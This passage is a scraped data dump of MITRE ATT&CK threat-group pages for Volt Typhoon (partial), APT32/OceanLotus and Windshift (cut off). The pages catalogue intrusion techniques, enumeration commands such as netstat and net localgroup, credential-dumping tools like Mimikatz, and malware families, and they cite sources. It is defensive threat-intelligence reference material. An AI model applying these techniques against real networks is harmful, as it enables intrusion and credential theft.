Exploitation resulted in the deployment of the VersaMem web shell for follow-on activity.[7] Enterprise T1518 Software Discovery Volt Typhoon has queried the Registry on compromised systems for information on installed software.[3][1] .001 Security Software Discovery KV Botnet Activity involved removal of security tools, as well as other identified IOT malware, from compromised devices.[5] Enterprise T1218 System Binary Proxy Execution Volt Typhoon has used native tools and processes including living off the land binaries or \"LOLBins\" to maintain and expand access to the victim networks.[1] Enterprise T1082 System Information Discovery Volt Typhoon has discovered file system types, drive names, size, and free space on compromised systems.[2][3][4][1] KV Botnet Activity includes use of native system tools, such as uname, to obtain information about victim device architecture, as well as gathering other system information such as the victim's hosts file and CPU utilization.[5] Enterprise T1614 System Location Discovery Volt Typhoon has obtained the victim's system current location.[1] Enterprise T1016 System Network Configuration Discovery Volt Typhoon has executed multiple commands to enumerate network topology and settings including ipconfig, netsh interface firewall show all, and netsh interface portproxy show all.[3] KV Botnet Activity gathers victim IP information during initial installation stages.[5] .001 Internet Connection Discovery Volt Typhoon has employed Ping to check network connectivity.[1] Enterprise T1049 System Network Connections Discovery Volt Typhoon has used netstat -ano on compromised hosts to enumerate network connections.[3][4] Enterprise T1033 System Owner/User Discovery Volt Typhoon has used public tools and executed the PowerShell command Get-EventLog security -instanceid 4624 to identify associated user and computer account names.[3][4][1] Enterprise T1007 System Service Discovery Volt Typhoon has used net start to list running services.[1] Enterprise T1124 System Time Discovery Volt Typhoon has obtained the victim's system timezone.[1] Enterprise T1552 Unsecured Credentials Volt Typhoon has obtained credentials insecurely stored on targeted network appliances.[1] .004 Private Keys Volt Typhoon has accessed a Local State file that contains the AES key used to encrypt passwords stored in the Chrome browser.[1] Enterprise T1078 Valid Accounts Volt Typhoon relies primarily on valid credentials for persistence.[1] .002 Domain Accounts Volt Typhoon has used compromised domain accounts to authenticate to devices on compromised networks.[2][4][1] Enterprise T1497 .001 Virtualization/Sandbox Evasion: System Checks Volt Typhoon has run system checks to determine if they were operating in a virtualized environment.[2] Enterprise T1047 Windows Management Instrumentation Volt Typhoon has leveraged WMIC for execution, remote system discovery, and to create and use temporary directories.[2][3][4][1] Software ID Name References Techniques S0160 certutil [4][1] Archive Collected Data: Archive via Utility, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Subvert Trust Controls: Install Root Certificate S0106 cmd [1] Command and Scripting Interpreter: Windows Command Shell, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Lateral Tool Transfer, System Information Discovery S1144 FRP [2][3] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: JavaScript, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Network Service Discovery, Non-Application Layer Protocol, Protocol Tunneling, Proxy, Proxy: Multi-hop Proxy, System Network Connections Discovery S0357 Impacket [2][3][1] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Lateral Tool Transfer, Network Sniffing, OS Credential Dumping: NTDS, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Ccache Files, System Services: Service Execution, Windows Management Instrumentation S0100 ipconfig [3] System Network Configuration Discovery S0002 Mimikatz [3][1] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0039 Net [4][1] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0108 netsh [2][3][1] Event Triggered Execution: Netsh Helper DLL, Impair Defenses: Disable or Modify System Firewall, Proxy, Software Discovery: Security Software Discovery S0104 netstat [4][1] System Network Connections Discovery S0359 Nltest [4][1] Domain Trust Discovery, Remote System Discovery, System Network Configuration Discovery S0097 Ping [2][1] Remote System Discovery S0029 PsExec [1] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0075 Reg [1] Modify Registry, Query Registry, Unsecured Credentials: Credentials in Registry S0096 Systeminfo [3][4][1] System Information Discovery S0057 Tasklist [3][4][1] Process Discovery, Software Discovery: Security Software Discovery, System Service Discovery S1154 VersaMem VersaMem was used by Volt Typhoon as part of Versa Director Zero Day Exploitation.[7] Command and Scripting Interpreter, Data Staged: Local Data Staging, Exploitation for Client Execution, Indicator Removal: File Deletion, Input Capture: Credential API Hooking, Network Sniffing, Obfuscated Files or Information: Encrypted/Encoded File, Shared Modules S0645 Wevtutil [3][1] Data from Local System, Impair Defenses: Disable Windows Event Logging, Indicator Removal: Clear Windows Event Logs References CISA et al.. (2024, February 7). PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure. Retrieved May 15, 2024. Microsoft Threat Intelligence. (2023, May 24). Volt Typhoon targets US critical infrastructure with living-off-the-land techniques. Retrieved July 27, 2023. NSA et al. (2023, May 24). People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection. Retrieved July 27, 2023. Counter Threat Unit Research Team. (2023, May 24). Chinese Cyberespionage Group BRONZE SILHOUETTE Targets U.S. Government and Defense Organizations. Retrieved July 27, 2023. Black Lotus Labs. (2023, December 13). Routers Roasting On An Open Firewall: The KV-Botnet Investigation. Retrieved June 10, 2024. US Department of Justice. (2024, January 31). U.S. Government Disrupts Botnet People\u2019s Republic of China Used to Conceal Hacking of Critical Infrastructure. Retrieved June 10, 2024. Black Lotus Labs. (2024, August 27). Taking The Crossroads: The Versa Director Zero-Day Exploitaiton. Retrieved August 27, 2024. "
},
{
"id": 86,
"title": "APT32, SeaLotus, OceanLotus, APT-C-00, Canvas Cyclone, BISMUTH, Group G0050",
"path": "/groups/G0050/index.html",
"content": " APT32 APT32 is a suspected Vietnam-based threat group that has been active since at least 2014. The group has targeted multiple private sector industries as well as foreign governments, dissidents, and journalists with a strong focus on Southeast Asian countries like Vietnam, the Philippines, Laos, and Cambodia. They have extensively used strategic web compromises to compromise victims.[1][2][3] ID: G0050 \u24d8 Associated Groups: SeaLotus, OceanLotus, APT-C-00, Canvas Cyclone, BISMUTH Contributors: Romain Dumont, ESET Version: 3.0 Created: 14 December 2017 Last Modified: 17 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description SeaLotus [4] OceanLotus [1][2][4][5][6] APT-C-00 [3][4][5][6] Canvas Cyclone [7] BISMUTH [7] Techniques Used Domain ID Name Use Enterprise T1087 .001 Account Discovery: Local Account APT32 enumerated administrative users using the commands net localgroup administrators.[8] Enterprise T1583 .001 Acquire Infrastructure: Domains APT32 has set up and operated websites to gather information and deliver malware.[9] .006 Acquire Infrastructure: Web Services APT32 has set up Dropbox, Amazon S3, and Google Drive to host malicious downloads.[9] Enterprise T1071 .001 Application Layer Protocol: Web Protocols APT32 has used JavaScript that communicates over HTTP or HTTPS to attacker controlled domains to download additional frameworks. The group has also used downloaded encrypted payloads over HTTP.[2][8] .003 Application Layer Protocol: Mail Protocols APT32 has used email for C2 via an Office macro.[4][8] Enterprise T1560 Archive Collected Data APT32's backdoor has used LZMA compression and RC4 encryption before exfiltration.[5] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder APT32 established persistence using Registry Run keys, both to execute PowerShell and VBS scripts as well as to execute their backdoor directly.[4][8][5] Enterprise T1059 Command and Scripting Interpreter APT32 has used COM scriptlets to download Cobalt Strike beacons.[8] .001 PowerShell APT32 has used PowerShell-based tools, PowerShell one-liners, and shellcode loaders for execution.[1][4][8] .003 Windows Command Shell APT32 has used cmd.exe for execution.[8] .005 Visual Basic APT32 has used macros, COM scriptlets, and VBS scripts.[4][8] .007 JavaScript APT32 has used JavaScript for drive-by downloads and C2 communications.[8][9] Enterprise T1543 .003 Create or Modify System Process: Windows Service APT32 modified Windows Services to ensure PowerShell scripts were loaded on the system. APT32 also creates a Windows service to establish persistence.[3][8][5] Enterprise T1189 Drive-by Compromise APT32 has infected victims by tricking them into visiting compromised watering hole websites.[3][9] Enterprise T1585 .001 Establish Accounts: Social Media Accounts APT32 has set up Facebook pages in tandem with fake websites.[9] Enterprise T1048 .003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol APT32's backdoor can exfiltrate data by encoding it in the subdomain field of DNS packets.[5] Enterprise T1041 Exfiltration Over C2 Channel APT32's backdoor has exfiltrated data using the already opened channel with its C&C server.[5] Enterprise T1203 Exploitation for Client Execution APT32 has used RTF document that includes an exploit to execute malicious code. (CVE-2017-11882)[5] Enterprise T1068 Exploitation for Privilege Escalation APT32 has used CVE-2016-7255 to escalate privileges.[1] Enterprise T1083 File and Directory Discovery APT32's backdoor possesses the capability to list files and directories on a machine. [5] Enterprise T1222 .002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification APT32's macOS backdoor changes the permission of the file it wants to execute to 755.[10] Enterprise T1589 Gather Victim Identity Information APT32 has conducted targeted surveillance against activists and bloggers.[6] .002 Email Addresses APT32 has collected e-mail addresses for activists and bloggers in order to target them with spyware.[6] Enterprise T1564 .001 Hide Artifacts: Hidden Files and Directories APT32's macOS backdoor hides the clientID file via a chflags function.[10] .003 Hide Artifacts: Hidden Window APT32 has used the WindowStyle parameter to conceal PowerShell windows. [1] [8] .004 Hide Artifacts: NTFS File Attributes APT32 used NTFS alternate data streams to hide their payloads.[8] Enterprise T1574 .001 Hijack Execution Flow: DLL APT32 ran legitimately-signed executables from Symantec and McAfee which load a malicious DLL. The group also side-loads its backdoor by dropping a library and a legitimate, signed executable (AcroTranscoder).[4][8][5] Enterprise T1070 .001 Indicator Removal: Clear Windows Event Logs APT32 has cleared select event log entries.[1] .004 Indicator Removal: File Deletion APT32's macOS backdoor can receive a \"delete\" command.[10] .006 Indicator Removal: Timestomp APT32 has used scheduled task raw XML with a backdated timestamp of June 2, 2016. The group has also set the creation time of the files dropped by the second stage of the exploit to match the creation time of kernel32.dll. Additionally, APT32 has used a random value to modify the timestamp of the file storing the clientID.[1][5][10] Enterprise T1105 Ingress Tool Transfer APT32 has added JavaScript to victim websites to download additional frameworks that profile and compromise website visitors.[2] Enterprise T1056 .001 Input Capture: Keylogging APT32 has abused the PasswordChangeNotify to monitor for and capture account password changes.[8] Enterprise T1570 Lateral Tool Transfer APT32 has deployed tools after moving laterally using administrative accounts.[8] Enterprise T1036 Masquerading APT32 has disguised a Cobalt Strike beacon as a Flash Installer.[8] .003 Rename Legitimate Utilities APT32 has moved and renamed pubprn.vbs to a .txt file to avoid detection.[11] .004 Masquerade Task or Service APT32 has used hidden or non-printing characters to help masquerade service names, such as appending a Unicode no-break space character to a legitimate service name. APT32 has also impersonated the legitimate Flash installer file name \"install_flashplayer.exe\".[1] .005 Match Legitimate Resource Name or Location APT32 has renamed a NetCat binary to kb-10233.exe to masquerade as a Windows update. APT32 has also renamed a Cobalt Strike beacon payload to install_flashplayers.exe. [8][9] Enterprise T1112 Modify Registry APT32's backdoor has modified the Windows Registry to store the backdoor's configuration. [5] Enterprise T1046 Network Service Discovery APT32 performed network scanning on the network to search for open ports, services, OS finger-printing, and other vulnerabilities.[8] Enterprise T1135 Network Share Discovery APT32 used the net view command to show all shares available, including the administrative shares such as C$ and ADMIN$.[8] Enterprise T1571 Non-Standard Port An APT32 backdoor can use HTTP over a non-standard TCP port (e.g 14146) which is specified in the backdoor configuration.[5] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation APT32 has used the Invoke-Obfuscation framework to obfuscate their PowerShell.[1][12][8] .011 Obfuscated Files or Information: Fileless Storage APT32's backdoor has stored its configuration in a registry key.[5] .013 Obfuscated Files or Information: Encrypted/Encoded File APT32 has performed code obfuscation, including encoding payloads using Base64 and using a framework called \"Dont-Kill-My-Cat (DKMC). APT32 also encrypts the library used for network exfiltration with AES-256 in CBC mode in their macOS backdoor.[1][12][3][4][8][5][10] .016 Obfuscated Files or Information: Junk Code Insertion APT32 includes garbage code to mislead anti-malware software and researchers.[3][5] Enterprise T1588 .002 Obtain Capabilities: Tool APT32 has obtained and used tools such as Mimikatz and Cobalt Strike, and a variety of other open-source tools from GitHub.[1][4] Enterprise T1137 Office Application Startup APT32 have replaced Microsoft Outlook's VbaProject.OTM file to install a backdoor macro for persistence.[4][8] Enterprise T1003 OS Credential Dumping APT32 used GetPassword_x64 to harvest credentials.[4][8] .001 LSASS Memory APT32 used Mimikatz and customized versions of Windows Credential Dumper to harvest credentials.[4][8] Enterprise T1566 .001 Phishing: Spearphishing Attachment APT32 has sent spearphishing emails with a malicious executable disguised as a document or spreadsheet.[3][4][8][5][13][6] .002 Phishing: Spearphishing Link APT32 has sent spearphishing emails containing malicious links.[3][4][13][9][6] Enterprise T1598 .003 Phishing for Information: Spearphishing Link APT32 has used malicious links to direct users to web pages designed to harvest credentials.[9] Enterprise T1055 Process Injection APT32 malware has injected a Cobalt Strike beacon into Rundll32.exe.[8] Enterprise T1012 Query Registry APT32's backdoor can query the Windows Registry to gather system information. [5] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares APT32 used Net to use Windows' hidden network shares to copy their tools to remote machines for execution.[8] Enterprise T1018 Remote System Discovery APT32 has enumerated DC servers using the command net group \"Domain Controllers\" /domain. The group has also used the ping command.[8] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task APT32 has used scheduled tasks to persist on victim systems.[1][4][8][5] Enterprise T1505 .003 Server Software Component: Web Shell APT32 has used Web shells to maintain access to victim websites.[2] Enterprise T1072 Software Deployment Tools APT32 compromised McAfee ePO to move laterally by distributing malware as a software deployment task.[1] Enterprise T1608 .001 Stage Capabilities: Upload Malware APT32 has hosted malicious payloads in Dropbox, Amazon S3, and Google Drive for use during targeting.[9] .004 Stage Capabilities: Drive-by Target APT32 has stood up websites containing numerous articles and content scraped from the Internet to make them appear legitimate, but some of these pages include malicious JavaScript to profile the potential victim or infect them via a fake software update.[9] Enterprise T1218 .005 System Binary Proxy Execution: Mshta APT32 has used mshta.exe for code execution.[4][8] .010 System Binary Proxy Execution: Regsvr32 APT32 created a Scheduled Task/Job that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory. The group has also used regsvr32 to run their backdoor.[5][1][8] .011 System Binary Proxy Execution: Rundll32 APT32 malware has used rundll32.exe to execute an initial infection process.[8] Enterprise T1082 System Information Discovery APT32 has collected the OS version and computer name from victims. One of the group's backdoors can also query the Windows Registry to gather system information, and another macOS backdoor performs a fingerprint of the machine on its first connection to the C&C server. APT32 executed shellcode to identify the name of the infected host.[3][5][10][13] Enterprise T1016 System Network Configuration Discovery APT32 used the ipconfig /all command to gather the IP address from the system.[8] Enterprise T1049 System Network Connections Discovery APT32 used the netstat -anpo tcp command to display TCP connections on the victim's machine.[8] Enterprise T1033 System Owner/User Discovery APT32 collected the victim's username and executed the whoami command on the victim's machine. APT32 executed shellcode to collect the username on the victim's machine. [13][3][8] Enterprise T1216 .001 System Script Proxy Execution: PubPrn APT32 has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses.[14] Enterprise T1569 .002 System Services: Service Execution APT32's backdoor has used Windows services as a way to execute its malicious payload. [5] Enterprise T1552 .002 Unsecured Credentials: Credentials in Registry APT32 used Outlook Credential Dumper to harvest credentials stored in Windows registry.[4][8] Enterprise T1550 .002 Use Alternate Authentication Material: Pass the Hash APT32 has used pass the hash for lateral movement.[8] .003 Use Alternate Authentication Material: Pass the Ticket APT32 successfully gained remote access by using pass the ticket.[8] Enterprise T1204 .001 User Execution: Malicious Link APT32 has lured targets to download a Cobalt Strike beacon by including a malicious link within spearphishing emails.[8][9][6] .002 User Execution: Malicious File APT32 has attempted to lure users to execute a malicious dropper delivered via a spearphishing attachment.[3][4][5][13][6] Enterprise T1078 .003 Valid Accounts: Local Accounts APT32 has used legitimate local admin account credentials.[1] Enterprise T1102 Web Service APT32 has used Dropbox, Amazon S3, and Google Drive to host malicious downloads.[9] Enterprise T1047 Windows Management Instrumentation APT32 used WMI to deploy their tools on remote machines and to gather information about the Outlook process.[8] Software ID Name References Techniques S0099 Arp [8] Remote System Discovery, System Network Configuration Discovery S0154 Cobalt Strike [1][2][4][8][9][6][15] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0354 Denis [4][8] Application Layer Protocol: DNS, Archive Collected Data: Archive via Library, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, File and Directory Discovery, Hijack Execution Flow, Hijack Execution Flow: DLL, Indicator Removal: File Deletion, Ingress Tool Transfer, Native API, Obfuscated Files or Information: Command Obfuscation, Obfuscated Files or Information, Process Injection: Process Hollowing, Query Registry, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, Virtualization/Sandbox Evasion: System Checks S0477 Goopy [8] Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: Mail Protocols, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Deobfuscate/Decode Files or Information, Exfiltration Over C2 Channel, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify Tools, Indicator Removal: Clear Mailbox Data, Masquerading: Match Legitimate Resource Name or Location, Native API, Obfuscated Files or Information: Junk Code Insertion, Obfuscated Files or Information: Binary Padding, Process Discovery, Scheduled Task/Job: Scheduled Task, System Owner/User Discovery S0100 ipconfig [8] System Network Configuration Discovery S0585 Kerrdown [6][15] Command and Scripting Interpreter: Visual Basic, Deobfuscate/Decode Files or Information, Hijack Execution Flow: DLL, Ingress Tool Transfer, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Compression, Phishing: Spearphishing Link, Phishing: Spearphishing Attachment, System Information Discovery, User Execution: Malicious File, User Execution: Malicious Link S0156 KOMPROGO [1] Command and Scripting Interpreter: Windows Command Shell, System Information Discovery, Windows Management Instrumentation S0002 Mimikatz [1][4][8] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0039 Net [8] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0108 netsh [8] Event Triggered Execution: Netsh Helper DLL, Impair Defenses: Disable or Modify System Firewall, Proxy, Software Discovery: Security Software Discovery S0352 OSX_OCEANLOTUS.D [16][6] Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Library, Archive Collected Data: Archive via Custom Method, Command and Scripting Interpreter: Unix Shell, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Create or Modify System Process: Launch Agent, Create or Modify System Process: Launch Daemon, Data Encoding: Standard Encoding, Data from Local System, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification, Hide Artifacts: Hidden Files and Directories, Indicator Removal: File Deletion, Indicator Removal: Timestomp, Ingress Tool Transfer, Masquerading: Masquerade Task or Service, Masquerading: Masquerade File Type, Non-Application Layer Protocol, Non-Standard Port, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Software Packing, Shared Modules, Subvert Trust Controls: Gatekeeper Bypass, System Information Discovery, System Network Configuration Discovery, Virtualization/Sandbox Evasion: System Checks S0158 PHOREAL [1] Command and Scripting Interpreter: Windows Command Shell, Modify Registry, Non-Application Layer Protocol S1078 RotaJakiro [17] Automated Collection, Boot or Logon Autostart Execution: XDG Autostart Entries, Boot or Logon Initialization Scripts, Create or Modify System Process: Systemd Service, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Event Triggered Execution: Unix Shell Configuration Modification, Exfiltration Over C2 Channel, Inter-Process Communication, Masquerading: Match Legitimate Resource Name or Location, Native API, Non-Application Layer Protocol, Non-Standard Port, Process Discovery, Shared Modules, System Information Discovery S0157 SOUNDBITE [1] Application Layer Protocol: DNS, Application Window Discovery, File and Directory Discovery, Modify Registry, System Information Discovery S0155 WINDSHIELD [1] Indicator Removal: File Deletion, Non-Application Layer Protocol, Query Registry, System Information Discovery, System Owner/User Discovery References Carr, N.. (2017, May 14). Cyber Espionage is Alive and Well: APT32 and the Threat to Global Corporations. Retrieved June 18, 2017. Lassalle, D., et al. (2017, November 6). OceanLotus Blossoms: Mass Digital Surveillance and Attacks Targeting ASEAN, Asian Nations, the Media, Human Rights Groups, and Civil Society. Retrieved November 6, 2017. Folt\u00fdn, T. (2018, March 13). OceanLotus ships new backdoor using old tricks. Retrieved May 22, 2018. Dahan, A. (2017, May 24). OPERATION COBALT KITTY: A LARGE-SCALE APT IN ASIA CARRIED OUT BY THE OCEANLOTUS GROUP. Retrieved November 5, 2018. Dumont, R. (2019, March 20). Fake or Fake: Keeping up with OceanLotus decoys. Retrieved April 1, 2019. Amnesty International. (2021, February 24). Vietnamese activists targeted by notorious hacking group. Retrieved March 1, 2021. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Dahan, A. (2017). Operation Cobalt Kitty. Retrieved December 27, 2018. Adair, S. and Lancaster, T. (2020, November 6). OceanLotus: Extending Cyber Espionage Operations Through Fake Websites. Retrieved November 20, 2020. Dumont, R.. (2019, April 9). OceanLotus: macOS malware update. Retrieved April 15, 2019. Carr, N.. (2017, December 26). Nick Carr Status Update APT32 pubprn. Retrieved September 12, 2024. Bohannon, D.. (2017, March 13). Invoke-Obfuscation - PowerShell Obfuscator. Retrieved June 18, 2017. Henderson, S., et al. (2020, April 22). Vietnamese Threat Actors APT32 Targeting Wuhan Government and Chinese Ministry of Emergency Management in Latest Example of COVID-19 Related Espionage. Retrieved April 28, 2020. Carr, N. (2017, December 22). ItsReallyNick Status Update. Retrieved September 12, 2024. Ray, V. and Hayashi, K. (2019, February 1). Tracking OceanLotus\u2019 new Downloader, KerrDown. Retrieved October 1, 2021. Horejsi, J. (2018, April 04). New MacOS Backdoor Linked to OceanLotus Found. Retrieved November 13, 2018. Alex Turing. (2021, May 6). RotaJakiro, the Linux version of the OceanLotus. Retrieved June 14, 2023. "
},
{
"id": 87,
"title": "Windshift, Bahamut, Group G0112",
"path": "/groups/G0112/index.html",
"content": " Windshift Windshift is a threat group that has been active since at least 2017, targeting specific individuals for surveillance in government departments and critical infrastructure across the Middle East.[1][2][3] ID: G0112 \u24d8 Associated Groups: Bahamut Version: 1.1 Created: 25 June 2020 Last Modified: 17 November 2024 Version Permalink Live Version Associated Group Descriptions Name Description Bahamut [1] Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols Windshift has used tools that communicate with C2 over HTTP.[4] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Windshift has created LNK files in the Startup folder to establish persistence.[4] Enterprise T1059 .005 Command and Scripting Interpreter: Visual Basic Windshift has used Visual Basic 6 (VB6) payloads.[4] Enterprise T1189 Drive-by Compromise Windshift has used compromised websites to register custom URL schemes on a remote system.[2] Enterprise T1105 Ingress Tool Transfer Windshift has used tools to deploy additional payloads to compromised hosts.[4] Enterprise T1036 Masquerading Windshift has used icons mimicking MS Office files to mask malicious executables.[2] Windshift has also attempted to hide executables by changing the file extension to \".scr\" to mimic Windows screensavers.[4] .001 Invalid Code Signature Windshift has used revoked certificates to sign malware.[2][1] Enterprise T1027 Obfuscated Files or Information Windshift has used string encoding with floating point calculations.[4] Enterprise T1566 .001 Phishing: Spearphishing Attachment Windshift has sent spearphishing emails with attachment to harvest credentials and deliver malware.[1] .002 Phishing: Spearphishing Link Windshift has sent spearphishing emails with links to harvest credentials and deliver malware.[1] .003 Phishing: Spearphishing via Service Windshift has used fake personas on social media to engage and target victims.[1] Enterprise T1057 Process Discovery Windshift has used malware to enumerate active processes.[4] Enterprise T1518 Software Discovery Windshift has used malware to identify installed software.[4] .001 Security Software Discovery Windshift has used malware to identify installed AV and commonly used forensic and malware analysis tools.[4] Enterprise T1082 System Information Discovery Windshift has used malware to identify the computer name of a compromised host.[4] Enterprise T1033 System Owner/User Discovery Windshift has used malware to identify the username on a compromised host.[4] Enterprise T1204 .001 User Execution: Malicious Link Windshift has used links embedded in e-mails to lure victims into executing malicious code.[1] .002 User Execution: Malicious File Windshift has used e-mail attachments to lure victims into executing malicious code.[1] Enterprise T1047 Windows Management Instrumentation Windshift has used WMI to collect information about target machines.[4] Mobile T1429 Audio Capture Windshift has included phone call and audio recording capabilities in the malicious apps deployed as part of Operation BULL and Operation ROCK.[4] Mobile T1533 Data from Local System Windshift has exfiltrated local account data and calendar information as part of Operation ROCK.[4] Mobile T1407 Download New Code at Runtime Windshift has included malware functionality capable of downloading new DEX files at runtime during Operation BULL.[4] Mobile T1521 .001 Encrypted Channel: Symmetric Cryptography Windshift has encrypted C2 communications using AES in CBC mode during Operation BULL and Operation ROCK.[4] Mobile T1627 .001 Execution Guardrails: Geofencing Windshift has region-locked their malicious applications during their Operation BULL campaign.[4] Mobile T1420 File and Directory Discovery Windshift has included file enumeration in the malicious apps deployed as part of Operation BULL and Operation ROCK.[4] Mobile T1628 .003 Hide Artifacts: Conceal Multimedia Files Windshift has hidden multimedia files from the user.[5] Mobile T1417 .001 Input Capture: Keylogging Windshift has included keylogging capabilities as part of Operation ROCK.[4] Mobile T1430 Location Tracking Windshift has included location tracking capabilities in the malicious apps deployed as part of Operation BULL and Operation ROCK.[4] Mobile T1406 Obfuscated Files or Information Windshift has encrypted application strings using AES in ECB mode and Blowfish, and stored strings encoded in hex during Operation BULL. Further, in Operation BULL, encryption keys were stored within the application\u2019s launcher icon file.[4] Mobile T1636 .003 Protected User Data: Contact List Windshift has included contact list exfiltration in the malicious apps deployed as part of Operation BULL.[4] .004 Protected User Data: SMS Messages Windshift has included SMS message exfiltration in the malicious apps deployed as part of Operation BULL and Operation ROCK.[4] Mobile T1632 .001 Subvert Trust Controls: Code Signing Policy Modification Windshift has installed malicious MDM profiles on iOS devices as part of Operation ROCK.[4] Mobile T1426 System Information Discovery Windshift has included system information enumeration in the malicious apps deployed as part of Operation BULL and Operation ROCK.[4] Mobile T1512 Video Capture Windshift has included video recording in the malicious apps deployed as part of Operation BULL.[4] Mobile T1633 